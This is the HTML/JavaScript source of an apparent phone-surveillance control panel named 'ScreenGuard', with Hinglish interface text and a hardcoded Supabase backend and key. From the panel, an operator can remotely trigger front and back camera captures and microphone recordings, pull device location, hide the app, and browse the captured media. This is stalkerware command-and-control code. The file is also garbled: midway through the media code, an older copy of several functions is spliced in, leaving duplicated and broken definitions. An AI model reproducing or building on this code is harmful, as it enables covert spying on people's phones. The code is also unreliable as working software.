<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ScreenGuard Panel</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div id="dashboard" class="screen">
    <div id="debugInfo" style="background:#F59E0B;color:#FFF;padding:10px;font-size:12px;font-weight:bold;text-align:center;">
        Starting...
    </div>

    <header class="app-header">
        <div class="header-left">
            <span class="logo">🛡️</span>
            <span class="app-name">ScreenGuard</span>
        </div>
        <div class="header-right">
            <button id="refreshBtn" class="icon-btn">🔄</button>
            <button id="logoutBtn" class="icon-btn">🚪</button>
        </div>
    </header>

    <main class="app-main">
        <section class="section">
            <h2 class="section-title">
                📱 Devices
                <button class="small-btn danger" id="clearDevicesBtn">🗑️ All Devices</button>
            </h2>
            <div id="devicesList" class="devices-grid">
                <div class="loading">Loading devices…</div>
            </div>
        </section>

        <section id="actionsSection" class="section hidden">
            <h2 class="section-title">
                <span id="selectedName">Device</span>
                <span id="selectedStatus" class="status-badge">—</span>
            </h2>

            <div class="device-info-row">
                <span>🔋 <span id="batteryText">—</span></span>
                <span>⏰ <span id="lastSeenText">—</span></span>
            </div>

            <h3 class="sub-title">🎮 Quick Actions</h3>
            <div class="actions-grid">
                <button class="action-btn" data-cmd="CAM_FRONT"><span class="icon">📸</span><span>Front Cam</span></button>
                <button class="action-btn" data-cmd="CAM_BACK"><span class="icon">📷</span><span>Back Cam</span></button>
                <button class="action-btn" data-cmd="MIC_RECORD:60"><span class="icon">🎤</span><span>Mic 60s</span></button>
                <button class="action-btn" data-cmd="MIC_STOP"><span class="icon">🔇</span><span>Mic Stop</span></button>
                <button class="action-btn" data-cmd="LOCATION"><span class="icon">📍</span><span>Location</span></button>
                <button class="action-btn" data-cmd="PING"><span class="icon">🏓</span><span>Ping</span></button>
                <button class="action-btn" data-cmd="HIDE"><span class="icon">🙈</span><span>Hide</span></button>
                <button class="action-btn" data-cmd="SHOW"><span class="icon">👁️</span><span>Show</span></button>
            </div>

            <h3 class="sub-title">⏱️ Custom Duration</h3>
            <div class="custom-row">
                <input type="number" id="customDuration" value="60" min="5" max="1800">
                <button class="small-btn" onclick="sendCustom('MIC_RECORD')">🎤 Mic</button>
            </div>

            <!-- COMMANDS SECTION -->
            <h3 class="sub-title">
                📋 Commands
                <span>
                    <button class="small-btn" id="refreshCommandsBtn">🔄</button>
                    <button class="small-btn danger" id="clearCommandsBtn">🗑️ All</button>
                </span>
            </h3>
            <div id="commandsList" class="commands-list">
                <div class="loading">Loading commands…</div>
            </div>

            <!-- MEDIA SECTION -->
            <h3 class="sub-title">
                🖼️ Recent Media
                <span>
                    <button class="small-btn" id="refreshMediaBtn">🔄</button>
                    <button class="small-btn danger" id="clearMediaBtn">🗑️ All</button>
                </span>
            </h3>
            <div id="mediaList" class="media-grid">
                <div class="loading">Loading media…</div>
            </div>
        </section>
    </main>
</div>

<div id="toast" class="toast hidden"></div>

<!-- Media viewer -->
<div id="viewer" class="viewer hidden">
    <div class="viewer-content" id="viewerContent"></div>
    <button class="viewer-close" id="viewerClose">✕</button>
</div>

<script>
(function() {
    'use strict';

    var SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
    var SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U";

    var currentDeviceKey = null;

    function setBanner(text, color) {
        var b = document.getElementById('debugInfo');
        if (b) { b.style.background = color; b.textContent = text; }
    }

    function getHeaders() {
        return {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
        };
    }

    function postHeaders() {
        return {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        };
    }

    function deleteHeaders() {
        return {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
            'Prefer': 'return=minimal'
        };
    }

    function timeAgo(ts) {
        if (!ts) return '—';
        var diff = Date.now() - new Date(ts).getTime();
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
        return Math.floor(diff / 86400000) + 'd ago';
    }

    function escapeHtml(str) {
        if (!str) return '';
        return String(str).replace(/[&<>"']/g, function(c) {
            return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
        });
    }

    function toast(msg, type) {
        var el = document.getElementById('toast');
        if (!el) return;
        el.textContent = msg;
        el.className = 'toast ' + (type || 'info');
        el.classList.remove('hidden');
        clearTimeout(window._toastTimer);
        window._toastTimer = setTimeout(function() {
            el.classList.add('hidden');
        }, 2500);
    }

    // ============================================
    // DEVICES
    // ============================================

    async function loadDevices() {
        var list = document.getElementById('devicesList');
        if (!list) return;

        list.innerHTML = '<div class="loading">Loading devices...</div>';
        setBanner('Fetching devices...', '#F59E0B');

        try {
            var url = SUPABASE_URL + '/rest/v1/devices?select=*&order=last_seen.desc';
            var res = await fetch(url, { headers: getHeaders() });

            if (!res.ok) {
                setBanner('❌ HTTP ' + res.status, '#EF4444');
                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
                return;
            }

            var data = await res.json();
            setBanner('✓ ' + data.length + ' device(s) loaded', '#10B981');

            if (!data || data.length === 0) {
                list.innerHTML = '<div class="empty">📭 Koi device nahi</div>';
                return;
            }

            list.innerHTML = data.map(function(d) {
                var isOnline = d.last_seen && (Date.now() - new Date(d.last_seen).getTime() < 5 * 60 * 1000);
                var name = ((d.brand || '') + ' ' + (d.model || '')).trim() || (d.device_key || '').substring(0, 8);
                var battery = d.battery_level >= 0 ? d.battery_level + '%' : '—';

                return '<div class="device-card-wrap">' +
                    '<div class="device-card" data-key="' + escapeHtml(d.device_key) + '">' +
                    '<div class="device-name">' +
                    '<span class="status-dot ' + (isOnline ? 'online' : 'offline') + '"></span>' +
                    escapeHtml(name) +
                    '</div>' +
                    '<div class="device-meta">' +
                    '<span>🔋 ' + battery + '</span>' +
                    '<span>' + timeAgo(d.last_seen) + '</span>' +
                    '</div>' +
                    '</div>' +
                    '<button class="device-delete" data-key="' + escapeHtml(d.device_key) + '" title="Delete device">🗑️</button>' +
                    '</div>';
            }).join('');

            // Select on card click
            list.querySelectorAll('.device-card').forEach(function(card) {
                card.addEventListener('click', function() {
                    selectDevice(card.dataset.key, data);
                });
            });

            // Delete button
            list.querySelectorAll('.device-delete').forEach(function(btn) {
                btn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    deleteDevice(btn.dataset.key);
                });
            });

            if (data.length === 1 && !currentDeviceKey) {
                selectDevice(data[0].device_key, data);
            }
        } catch (e) {
            setBanner('❌ ' + e.message, '#EF4444');
            list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
        }
    }

    function selectDevice(key, devices) {
        currentDeviceKey = key;
        document.querySelectorAll('.device-card').forEach(function(c) {
            c.classList.toggle('active', c.dataset.key === key);
        });

        var device = null;
        for (var i = 0; i < devices.length; i++) {
            if (devices[i].device_key === key) { device = devices[i]; break; }
        }
        if (!device) return;

        var actionsSection = document.getElementById('actionsSection');
        if (actionsSection) actionsSection.classList.remove('hidden');

        var name = ((device.brand || '') + ' ' + (device.model || '')).trim() || key.substring(0, 8);
        var nameEl = document.getElementById('selectedName');
        if (nameEl) nameEl.textContent = name;

        var isOnline = device.last_seen && (Date.now() - new Date(device.last_seen).getTime() < 5 * 60 * 1000);
        var statusEl = document.getElementById('selectedStatus');
        if (statusEl) {
            statusEl.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
            statusEl.className = 'status-badge ' + (isOnline ? 'online' : 'offline');
        }

        var batteryEl = document.getElementById('batteryText');
        if (batteryEl) batteryEl.textContent = device.battery_level >= 0 ? device.battery_level + '%' : '—';

        var lastSeenEl = document.getElementById('lastSeenText');
        if (lastSeenEl) lastSeenEl.textContent = timeAgo(device.last_seen);

        loadCommands();
        loadMedia();
    }

    // ⭐ DELETE SINGLE DEVICE
    async function deleteDevice(key) {
        if (!confirm('Device delete karein?\n\n' + key + '\n\nIske saath saari commands aur media bhi delete karein?')) return;

        try {
            // 1. Delete commands
            var cmdsRes = await fetch(
                SUPABASE_URL + '/rest/v1/commands?device_key=eq.' + encodeURIComponent(key),
                { method: 'DELETE', headers: deleteHeaders() }
            );

            // 2. Delete media
            var mediaRes = await fetch(
                SUPABASE_URL + '/rest/v1/media?device_key=eq.' + encodeURIComponent(key),
                { method: 'DELETE', headers: deleteHeaders() }
            );

            // 3. Delete device
            var devRes = await fetch(
                SUPABASE_URL + '/rest/v1/devices?device_key=eq.' + encodeURIComponent(key),
                { method: 'DELETE', headers: deleteHeaders() }
            );

            if (!devRes.ok) throw new Error('HTTP ' + devRes.status);

            toast('✓ Device + data deleted', 'success');
            currentDeviceKey = null;
            document.getElementById('actionsSection').classList.add('hidden');
            setTimeout(loadDevices, 800);
        } catch (e) {
            toast('Fail: ' + e.message, 'error');
        }
    }

    // ⭐ DELETE ALL DEVICES
    async function clearAllDevices() {
        if (!confirm('⚠️ SAARE devices delete karein?\n\nIsse commands aur media bhi delete ho jayengi.')) return;
        if (!confirm('Ek baar phir confirm — saara data delete ho jayega?')) return;

        try {
            await fetch(
                SUPABASE_URL + '/rest/v1/commands?id=not.is.null',
                { method: 'DELETE', headers: deleteHeaders() }
            );
            await fetch(
                SUPABASE_URL + '/rest/v1/media?id=not.is.null',
                { method: 'DELETE', headers: deleteHeaders() }
            );
            await fetch(
                SUPABASE_URL + '/rest/v1/devices?device_key=not.is.null',
                { method: 'DELETE', headers: deleteHeaders() }
            );

            toast('✓ All devices deleted', 'success');
            currentDeviceKey = null;
            document.getElementById('actionsSection').classList.add('hidden');
            setTimeout(loadDevices, 800);
        } catch (e) {
            toast('Fail: ' + e.message, 'error');
        }
    }

    // ============================================
    // COMMANDS
    // ============================================

    async function loadCommands() {
        var list = document.getElementById('commandsList');
        if (!list || !currentDeviceKey) return;

        list.innerHTML = '<div class="loading">Loading commands...</div>';

        try {
            var url = SUPABASE_URL + '/rest/v1/commands?device_key=eq.' +
                encodeURIComponent(currentDeviceKey) +
                '&select=*&order=sent_at.desc&limit=20';
            var res = await fetch(url, { headers: getHeaders() });

            if (!res.ok) {
                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
                return;
            }

            var data = await res.json();

            if (!data || data.length === 0) {
                list.innerHTML = '<div class="empty">Koi commands nahi</div>';
                return;
            }

            list.innerHTML = data.map(function(c) {
                var statusColor = '#6B7280';
                if (c.status === 'done') statusColor = '#10B981';
                else if (c.status === 'failed') statusColor = '#EF4444';
                else if (c.status === 'processing') statusColor = '#F59E0B';

                return '<div class="cmd-item">' +
                    '<div class="cmd-info">' +
                    '<div class="cmd-name">' + escapeHtml(c.cmd) + '</div>' +
                    '<div class="cmd-time">' + timeAgo(c.sent_at) + '</div>' +
                    '</div>' +
                    '<div class="cmd-status" style="color:' + statusColor + ';">' + escapeHtml(c.status) + '</div>' +
                    '<button class="cmd-delete" data-id="' + c.id + '">🗑️</button>' +
                    '</div>';
            }).join('');

            list.querySelectorAll('.cmd-delete').forEach(function(btn) {
                btn.addEventListener('click', function() {
                    deleteCommand(btn.dataset.id);
                });
            });
        } catch (e) {
            list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
        }
    }

    async function deleteCommand(id) {
        if (!confirm('Ye command delete karein?')) return;

        try {
            var url = SUPABASE_URL + '/rest/v1/commands?id=eq.' + encodeURIComponent(id);
            var res = await fetch(url, {
                method: 'DELETE',
                headers: deleteHeaders()
            });

            if (!res.ok) throw new Error('HTTP ' + res.status);
            toast('✓ Deleted', 'success');
            loadCommands();
        } catch (e) {
            toast('Fail: ' + e.message, 'error');
        }
    }

    async function clearAllCommands() {
        if (!currentDeviceKey) {
            toast('Pehle device select karo', 'error');
            return;
        }
        if (!confirm('SAB commands delete karein is device ki?')) return;

        try {
            var url = SUPABASE_URL + '/rest/v1/commands?device_key=eq.' +
                encodeURIComponent(currentDeviceKey);
            var res = await fetch(url, {
                method: 'DELETE',
                headers: deleteHeaders()
            });

            if (!res.ok) throw new Error('HTTP ' + res.status);
            toast('✓ All commands deleted', 'success');
            loadCommands();
        } catch (e) {
            toast('Fail: ' + e.message, 'error');
        }
    }

    // ============================================
    // SEND COMMAND
    // ============================================

    async function sendCommand(btn, cmd) {
        if (!currentDeviceKey) {
            toast('Pehle device select karo', 'error');
            return;
        }

        if (btn) {
            btn.disabled = true;
            setTimeout(function() { btn.disabled = false; }, 1500);
        }

        try {
            var url = SUPABASE_URL + '/rest/v1/commands';
            var res = await fetch(url, {
                method: 'POST',
                headers: postHeaders(),
                body: JSON.stringify({
                    device_key: currentDeviceKey,
                    cmd: cmd,
                    status: 'pending'
                })
            });

            if (!res.ok) throw new Error('HTTP ' + res.status);

            toast('✓ ' + cmd + ' bheja', 'success');
            setTimeout(loadCommands, 1000);
        } catch (e) {
            toast('Fail: ' + e.message, 'error');
        }
    }

    function sendCustom(type) {
        var el = document.getElementById('customDuration');
        var d = parseInt(el ? el.value : 60) || 60;
        sendCommand(null, type + ':' + d);
    }

    // ============================================
    // MEDIA
    // ============================================

    async function loadMedia() {
        var list = document.getElementById('mediaList');
        if (!list || !currentDeviceKey) return;

        list.innerHTML = '<div class="loading">Loading media...</div>';

        try {
            var url = SUPABASE_URL + '/rest/v1/media?device_key=eq.' +
                encodeURIComponent(currentDeviceKey) +
                '&select=*&order=created_at.desc&limit=20';
            var res = await fetch(url, { headers: getHeaders() });

            if (!res.ok) {
                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
                return;
            }

            var data = await res.json();

            if (!data || data.length === 0) {
                list.innerHTML = '<div class="empty">Koi media nahi</div>';
                return;
            }

            list.innerHTML = data.map(function(m) {
                var mediaUrl = m.public_url;
                if (!mediaUrl) {
                    mediaUrl = SUPABASE_URL + '/storage/v1/object/public/media/' + m.storage_path;
                }

                var type = m.media_type || 'photo';
                var icon = '📄';
                if (type === 'photo') icon = '📸';
                else if (type === 'video') icon = '🎥';
                else if (type === 'audio') icon = '🎤';
                else if (type === 'screen') icon = '📹';

                var preview = '';
                if (type === 'photo' || type === 'screen') {
                    preview = '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">';
                } else if (type === 'audio') {
                    preview = '<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px;">🎤</divery_level + '%' : '—';
        
        var lastSeenEl = document.getElementById('lastSeenText');
        if (lastSeenEl) lastSeenEl.textContent = timeAgo(device.last_seen);
        
        loadMedia();
    }
    
    async function sendCommand(btn, cmd) {
        if (!currentDeviceKey) {
            toast('Pehle device select karo', 'error');
            return;
        }
        
        if (btn) {
            btn.disabled = true;
            setTimeout(function() { btn.disabled = false; }, 1500);
        }
        
        try {
            var url = SUPABASE_URL + '/rest/v1/commands';
            var res = await fetch(url, {
                method: 'POST',
                headers: postHeaders(),
                body: JSON.stringify({
                    device_key: currentDeviceKey,
                    cmd: cmd,
                    status: 'pending'
                })
            });
            
            if (!res.ok) {
                var t = await res.text();
                throw new Error('HTTP ' + res.status + ': ' + t.substring(0, 100));
            }
            
            toast('✓ ' + cmd + ' bheja', 'success');
            console.log('[Command] Sent:', cmd);
        } catch (e) {
            console.error('[Command]', e);
            toast('Fail: ' + e.message, 'error');
        }
    }
    
    function sendCustom(type) {
        var el = document.getElementById('customDuration');
        var d = parseInt(el ? el.value : 30) || 30;
        sendCommand(null, type + ':' + d);
    }
    
    async function loadMedia() {
        var list = document.getElementById('mediaList');
        if (!list || !currentDeviceKey) return;
        
        list.innerHTML = '<div class="loading">Loading media...</div>';
        
        try {
            var url = SUPABASE_URL + '/rest/v1/media?device_key=eq.' + encodeURIComponent(currentDeviceKey) + '&select=*&order=created_at.desc&limit=20';
            var res = await fetch(url, { headers: getHeaders() });
            
            if (!res.ok) {
                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
                return;
            }
            
            var data = await res.json();
            
            if (!data || data.length === 0) {
                list.innerHTML = '<div class="empty">Koi media nahi</div>';
                return;
            }
            
            list.innerHTML = data.map(function(m) {
                var mediaUrl = m.public_url || '';
                var type = m.media_type || 'photo';
                var icon = '📄';
                if (type === 'photo') icon = '📸';
                else if (type === 'video') icon = '🎥';
                else if (type === 'audio') icon = '🎤';
                else if (type === 'screen') icon = '📹';
                
                return '<div class="media-item" data-url="' + escapeHtml(mediaUrl) + '">' +
                    '<div class="media-icon">' + icon + '</div>' +
                    '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
                    '<div class="media-item-label">' +
                    '<span>' + type + '</span>' +
                    '<span>' + timeAgo(m.created_at) + '</span>' +
                    '</div>' +
                    '</div>';
            }).join('');
            
            list.querySelectorAll('.media-item').forEach(function(item) {
                item.addEventListener('click', function() {
                    window.open(item.dataset.url, '_blank');
                });
            });
        } catch (e) {
            console.error('[Media]', e);
            list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
        }
    }
    
    // Expose globally
    window.sendCustom = sendCustom;
    
    // INIT
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[Panel] DOM loaded');
        
        var refreshBtn = document.getElementById('refreshBtn');
        if (refreshBtn) refreshBtn.addEventListener('click', function() { location.reload(); });
        
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) logoutBtn.addEventListener('click', function() { location.reload(); });
        
        var rm = document.getElementById('refreshMediaBtn');
        if (rm) rm.addEventListener('click', loadMedia);
        
        document.querySelectorAll('.action-btn[data-cmd]').forEach(function(btn) {
            btn.addEventListener('click', function() {
                sendCommand(btn, btn.dataset.cmd);
            });
        });
        
        // Load devices
        loadDevices();
    });
    
})();
</script>

</body>
</html>
